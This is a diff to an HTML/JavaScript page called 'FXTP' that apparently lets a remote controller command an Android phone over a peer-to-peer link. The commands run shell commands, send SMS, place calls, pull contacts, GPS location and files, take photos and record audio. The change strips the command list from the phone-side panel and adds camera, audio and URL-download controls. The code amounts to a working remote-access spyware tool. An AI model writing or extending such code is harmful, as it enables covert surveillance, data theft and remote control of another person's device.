@@ -42,9 +42,6 @@
         .log .received { color: #ffb74d; }
         .log .error { color: #e94560; }
         .log .info { color: #8a8a9e; }
-        .cmd-list { font-size: 12px; color: #8a8a9e; max-height: 200px; overflow-y: auto; }
-        .cmd-list .cmd { color: #00f0ff; }
-        .cmd-list .desc { color: #6a6a82; }
         @media (max-width: 480px) { .grid-3 { grid-template-columns: 1fr 1fr; } }
     </style>
 </head>
@@ -54,60 +51,26 @@
         <h1>⚡ FXTP</h1>
     </div>
 
-    <!-- Mode Selector -->
     <div class="mode-selector">
         <button class="device-mode active" id="btnDeviceMode" onclick="setMode('device')">📱 Device</button>
         <button class="controller-mode" id="btnControllerMode" onclick="setMode('controller')">🎮 Controller</button>
     </div>
 
-    <!-- Device Mode Panel -->
+    <!-- Device Panel -->
     <div id="devicePanel">
         <div class="card">
             <div class="card-title">📡 Device Listener</div>
             <div class="id-box" id="peerIdDisplay">Initializing...</div>
             <div class="status" id="statusDisplay">⏳ Waiting for connection...</div>
         </div>
-
-        <div class="card">
-            <div class="card-title">📋 Available Commands</div>
-            <div class="cmd-list">
-                <div><span class="cmd">ping</span> <span class="desc">– test connection</span></div>
-                <div><span class="cmd">screenshot</span> <span class="desc">– capture screen</span></div>
-                <div><span class="cmd">start_mirror</span> <span class="desc">– start live mirror</span></div>
-                <div><span class="cmd">stop_mirror</span> <span class="desc">– stop mirror</span></div>
-                <div><span class="cmd">shell "cmd"</span> <span class="desc">– run shell command</span></div>
-                <div><span class="cmd">launch_app "pkg"</span> <span class="desc">– launch app</span></div>
-                <div><span class="cmd">list_files "path"</span> <span class="desc">– list directory</span></div>
-                <div><span class="cmd">download_file "path"</span> <span class="desc">– download file</span></div>
-                <div><span class="cmd">notification "msg"</span> <span class="desc">– send notification</span></div>
-                <div><span class="cmd">clipboard "text"</span> <span class="desc">– set clipboard</span></div>
-                <div><span class="cmd">get_clipboard</span> <span class="desc">– get clipboard</span></div>
-                <div><span class="cmd">sms "number|msg"</span> <span class="desc">– send SMS</span></div>
-                <div><span class="cmd">contacts</span> <span class="desc">– list contacts</span></div>
-                <div><span class="cmd">location</span> <span class="desc">– get GPS</span></div>
-                <div><span class="cmd">camera</span> <span class="desc">– take photo</span></div>
-                <div><span class="cmd">audio "sec"</span> <span class="desc">– record audio</span></div>
-                <div><span class="cmd">device_info</span> <span class="desc">– device info</span></div>
-                <div><span class="cmd">packages</span> <span class="desc">– installed apps</span></div>
-                <div><span class="cmd">wifi</span> <span class="desc">– scan WiFi</span></div>
-                <div><span class="cmd">flashlight true/false</span> <span class="desc">– flashlight</span></div>
-                <div><span class="cmd">vibrate "ms"</span> <span class="desc">– vibrate</span></div>
-                <div><span class="cmd">brightness "0-100"</span> <span class="desc">– brightness</span></div>
-                <div><span class="cmd">volume "0-100"</span> <span class="desc">– volume</span></div>
-                <div><span class="cmd">download_url "url"</span> <span class="desc">– download from URL</span></div>
-                <div><span class="cmd">call "number"</span> <span class="desc">– call</span></div>
-                <div><span class="cmd">lock</span> <span class="desc">– lock screen</span></div>
-                <div><span class="cmd">html "code"</span> <span class="desc">– display HTML</span></div>
-            </div>
-        </div>
     </div>
 
-    <!-- Controller Mode Panel -->
+    <!-- Controller Panel -->
     <div id="controllerPanel" style="display:none;">
         <div class="card">
-            <div class="card-title">📡 Connect to Device</div>
+            <div class="card-title">📡 Connect</div>
             <div class="input-group">
-                <input id="targetPeerId" placeholder="Enter Device Peer ID" />
+                <input id="targetPeerId" placeholder="Device Peer ID" />
                 <button class="btn btn-success" onclick="connectToPeer()">Connect</button>
                 <button class="btn btn-danger" onclick="disconnect()">Disconnect</button>
             </div>
@@ -115,7 +78,7 @@
         </div>
 
         <div class="card">
-            <div class="card-title">🎮 Quick Actions</div>
+            <div class="card-title">🎮 Actions</div>
             <div class="grid-3">
                 <button class="btn btn-primary" onclick="sendCmd('screenshot')">📸 Screenshot</button>
                 <button class="btn btn-primary" onclick="sendCmd('start_mirror')">🖥️ Mirror</button>
@@ -130,10 +93,10 @@
         <div class="card">
             <div class="card-title">⚙️ Advanced</div>
             <div class="grid-2">
-                <button class="btn btn-outline btn-sm" onclick="promptCmd('launch_app','Package name:')">🚀 Launch</button>
+                <button class="btn btn-outline btn-sm" onclick="promptCmd('launch_app','Package:')">🚀 Launch</button>
                 <button class="btn btn-outline btn-sm" onclick="promptCmd('list_files','Path:','/sdcard')">📂 List</button>
                 <button class="btn btn-outline btn-sm" onclick="promptCmd('download_file','File path:')">⬇️ Download</button>
-                <button class="btn btn-outline btn-sm" onclick="promptCmd('shell','Shell command:')">💻 Shell</button>
+                <button class="btn btn-outline btn-sm" onclick="promptCmd('shell','Command:')">💻 Shell</button>
                 <button class="btn btn-outline btn-sm" onclick="promptCmdSms()">📩 SMS</button>
                 <button class="btn btn-outline btn-sm" onclick="sendCmd('contacts')">👤 Contacts</button>
                 <button class="btn btn-outline btn-sm" onclick="sendCmd('location')">📍 Location</button>
@@ -142,14 +105,18 @@
             <div style="margin-top:10px; display:flex; gap:6px; flex-wrap:wrap;">
                 <button class="btn btn-outline btn-sm" onclick="sendCmd('flashlight',true)">🔦 On</button>
                 <button class="btn btn-outline btn-sm" onclick="sendCmd('flashlight',false)">🔦 Off</button>
-                <button class="btn btn-outline btn-sm" onclick="promptCmd('vibrate','Duration (ms):','1000')">📳 Vibrate</button>
-                <button class="btn btn-outline btn-sm" onclick="promptCmd('brightness','Brightness (0-100):','50')">☀️ Bright</button>
-                <button class="btn btn-outline btn-sm" onclick="promptCmd('volume','Volume (0-100):','50')">🔊 Volume</button>
+                <button class="btn btn-outline btn-sm" onclick="promptCmd('vibrate','Duration ms:','1000')">📳 Vibrate</button>
+                <button class="btn btn-outline btn-sm" onclick="promptCmd('brightness','Brightness 0-100:','50')">☀️ Bright</button>
+                <button class="btn btn-outline btn-sm" onclick="promptCmd('volume','Volume 0-100:','50')">🔊 Volume</button>
             </div>
             <div style="margin-top:10px;">
                 <button class="btn btn-primary btn-sm" onclick="sendCmd('lock')">🔒 Lock</button>
-                <button class="btn btn-primary btn-sm" onclick="promptCmd('html','HTML code:','<h1 style=\"color:#00f0ff;\">FXTP</h1>')">📄 HTML</button>
-                <button class="btn btn-outline btn-sm" onclick="promptCmd('call','Phone number:')">📞 Call</button>
+                <button class="btn btn-primary btn-sm" onclick="promptCmd('html','HTML:','<h1 style=\"color:#00f0ff;\">FXTP</h1>')">📄 HTML</button>
+                <button class="btn btn-outline btn-sm" onclick="promptCmd('call','Phone:')">📞 Call</button>
+                <button class="btn btn-outline btn-sm" onclick="promptCmd('download_url','URL:')">⬇️ Download URL</button>
+                <button class="btn btn-outline btn-sm" onclick="sendCmd('camera')">📷 Camera</button>
+                <button class="btn btn-outline btn-sm" onclick="promptCmd('audio','Duration sec:','5')">🎤 Audio</button>
+                <button class="btn btn-outline btn-sm" onclick="sendCmd('packages')">📦 Packages</button>
             </div>
         </div>
     </div>
@@ -164,11 +131,15 @@
         // ========================================
         // STATE
         // ========================================
-        let peer = null;
-        let connection = null;
-        let myId = '';
-        let currentMode = 'device';
-        let isConnected = false;
+        let peer = null, connection = null, myId = '', currentMode = 'device', isConnected = false;
+
+        function log(msg, type = 'info') {
+            const el = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            const colors = { sent: 'sent', received: 'received', error: 'error', info: 'info' };
+            el.innerHTML += `<span class="time">[${time}]</span> <span class="${colors[type] || 'info'}">${msg}</span>\n`;
+            el.scrollTop = el.scrollHeight;
+        }
 
         // ========================================
         // MODE SWITCH
@@ -179,22 +150,8 @@
             document.getElementById('btnControllerMode').classList.toggle('active', mode === 'controller');
             document.getElementById('devicePanel').style.display = mode === 'device' ? 'block' : 'none';
             document.getElementById('controllerPanel').style.display = mode === 'controller' ? 'block' : 'none';
-            if (mode === 'device') {
-                initDevice();
-            } else {
-                if (!peer) initPeer();
-            }
-        }
-
-        // ========================================
-        // LOG
-        // ========================================
-        function log(msg, type = 'info') {
-            const el = document.getElementById('log');
-            const time = new Date().toLocaleTimeString();
-            const colors = { sent: 'sent', received: 'received', error: 'error', info: 'info' };
-            el.innerHTML += `<span class="time">[${time}]</span> <span class="${colors[type] || 'info'}">${msg}</span>\n`;
-            el.scrollTop = el.scrollHeight;
+            if (mode === 'device') initDevice();
+            else if (!peer) initPeer();
         }
 
         // ========================================
@@ -226,9 +183,7 @@
                     connection = null;
                 });
             });
-            peer.on('error', (err) => {
-                log('❌ Peer error: ' + err.message, 'error');
-            });
+            peer.on('error', (err) => { log('❌ Peer error: ' + err.message, 'error'); });
         }
 
         // ========================================
@@ -236,11 +191,7 @@
         // ========================================
         function handleCommand(data) {
             const type = data.type;
-            if (type === 'ping') {
-                if (connection) connection.send({ type: 'pong', value: 'alive' });
-                return;
-            }
-            // Map to bridge methods
+            if (type === 'ping') { if (connection) connection.send({ type: 'pong', value: 'alive' }); return; }
             const map = {
                 'screenshot': 'takeScreenshot',
                 'start_mirror': 'startMirror',
@@ -270,18 +221,14 @@
                 'html': 'displayHtml'
             };
             const method = map[type];
-            if (!method) {
-                if (connection) connection.send({ type: 'error', value: 'Unknown command: ' + type });
-                return;
-            }
+            if (!method) { if (connection) connection.send({ type: 'error', value: 'Unknown: ' + type }); return; }
             if (typeof AndroidBridge !== 'undefined' && typeof AndroidBridge[method] === 'function') {
                 try {
-                    let result = data.value !== undefined ? AndroidBridge[method](data.value) : AndroidBridge[method]();
-                    if (result !== undefined && connection) {
-                        connection.send({ type: method + '_result', value: result });
-                    } else if (connection) {
-                        connection.send({ type: method + '_result', value: 'ok' });
-                    }
+                    let result;
+                    if (data.value !== undefined) result = AndroidBridge[method](data.value);
+                    else result = AndroidBridge[method]();
+                    if (result !== undefined && connection) connection.send({ type: method + '_result', value: result });
+                    else if (connection) connection.send({ type: method + '_result', value: 'ok' });
                 } catch (e) {
                     if (connection) connection.send({ type: 'error', value: 'Exception: ' + e.message });
                 }
@@ -296,20 +243,13 @@
         function initPeer() {
             if (peer) return;
             peer = new Peer();
-            peer.on('open', (id) => {
-                myId = id;
-                log('🔑 Controller ready: ' + id, 'info');
-            });
+            peer.on('open', (id) => { myId = id; log('🔑 Controller ready: ' + id, 'info'); });
             peer.on('connection', (conn) => {
-                connection = conn;
-                isConnected = true;
+                connection = conn; isConnected = true;
                 document.getElementById('ctrlStatus').textContent = '✅ Connected';
                 document.getElementById('ctrlStatus').style.color = '#4caf50';
                 log('✅ Connected!', 'info');
-                conn.on('data', (data) => {
-                    log('📩 Received: ' + JSON.stringify(data), 'received');
-                    handleResponse(data);
-                });
+                conn.on('data', (data) => { log('📩 Received: ' + JSON.stringify(data), 'received'); handleResponse(data); });
                 conn.on('close', () => {
                     isConnected = false;
                     document.getElementById('ctrlStatus').textContent = '🔴 Disconnected';
@@ -318,26 +258,20 @@
                     connection = null;
                 });
             });
-            peer.on('error', (err) => {
-                log('❌ Peer error: ' + err.message, 'error');
-            });
+            peer.on('error', (err) => { log('❌ Peer error: ' + err.message, 'error'); });
         }
 
         function connectToPeer() {
             const target = document.getElementById('targetPeerId').value.trim();
-            if (!target) { log('❌ Enter a Peer ID.', 'error'); return; }
+            if (!target) { log('❌ Enter Peer ID.', 'error'); return; }
             if (!peer) initPeer();
             const conn = peer.connect(target);
             conn.on('open', () => {
-                connection = conn;
-                isConnected = true;
+                connection = conn; isConnected = true;
                 document.getElementById('ctrlStatus').textContent = '✅ Connected to ' + target;
                 document.getElementById('ctrlStatus').style.color = '#4caf50';
                 log('✅ Connected to ' + target, 'info');
-                conn.on('data', (data) => {
-                    log('📩 Received: ' + JSON.stringify(data), 'received');
-                    handleResponse(data);
-                });
+                conn.on('data', (data) => { log('📩 Received: ' + JSON.stringify(data), 'received'); handleResponse(data); });
                 conn.on('close', () => {
                     isConnected = false;
                     document.getElementById('ctrlStatus').textContent = '🔴 Disconnected';
@@ -346,9 +280,7 @@
                     connection = null;
                 });
             });
-            conn.on('error', (err) => {
-                log('❌ Connection error: ' + err.message, 'error');
-            });
+            conn.on('error', (err) => { log('❌ Connection error: ' + err.message, 'error'); });
         }
 
         function disconnect() {
@@ -390,7 +322,7 @@
                     win.document.write('<img src="data:image/png;base64,' + val + '" style="max-width:100%;" />');
                     win.document.title = type === 'screenshot_data' ? 'Screenshot' : 'Camera';
                 } else {
-                    log('📷 ' + (type === 'screenshot_data' ? 'Screenshot' : 'Camera') + ' data received', 'received');
+                    log('📷 ' + (type === 'screenshot_data' ? 'Screenshot' : 'Camera') + ' received', 'received');
                 }
             } else if (type === 'mirror_frame') {
                 log('🖥️ Mirror frame received', 'received');
@@ -407,27 +339,15 @@
                 a.download = 'audio.3gp';
                 a.click();
             } else if (type === 'file_list') {
-                try {
-                    const arr = JSON.parse(val);
-                    log('📂 Files: ' + arr.map(f => f.name + (f.isDir ? '/' : '')).join(', '), 'received');
-                } catch { log('📂 ' + val, 'received'); }
+                try { const arr = JSON.parse(val); log('📂 ' + arr.map(f => f.name + (f.isDir ? '/' : '')).join(', '), 'received'); } catch { log('📂 ' + val, 'received'); }
             } else if (type === 'shell_result') {
                 log('💻 ' + val, 'received');
             } else if (type === 'device_info') {
-                try {
-                    const info = JSON.parse(val);
-                    log('📱 ' + Object.entries(info).map(([k, v]) => k + ': ' + v).join(' | '), 'received');
-                } catch { log('📱 ' + val, 'received'); }
+                try { const info = JSON.parse(val); log('📱 ' + Object.entries(info).map(([k, v]) => k + ': ' + v).join(' | '), 'received'); } catch { log('📱 ' + val, 'received'); }
             } else if (type === 'contacts') {
-                try {
-                    const arr = JSON.parse(val);
-                    log('👤 ' + arr.map(c => c.name + ' (' + c.number + ')').join('; '), 'received');
-                } catch { log('👤 ' + val, 'received'); }
+                try { const arr = JSON.parse(val); log('👤 ' + arr.map(c => c.name + ' (' + c.number + ')').join('; '), 'received'); } catch { log('👤 ' + val, 'received'); }
             } else if (type === 'wifi') {
-                try {
-                    const arr = JSON.parse(val);
-                    log('📶 ' + arr.map(w => w.ssid + ' (' + w.rssi + 'dBm)').join('; '), 'received');
-                } catch { log('📶 ' + val, 'received'); }
+                try { const arr = JSON.parse(val); log('📶 ' + arr.map(w => w.ssid + ' (' + w.rssi + 'dBm)').join('; '), 'received'); } catch { log('📶 ' + val, 'received'); }
             } else if (type === 'location') {
                 log('📍 ' + val, 'received');
             } else if (type === 'packages') {
@@ -444,7 +364,6 @@
         // ========================================
         // START
         // ========================================
-        // Default: Device mode
         setMode('device');
     </script>
 </body>
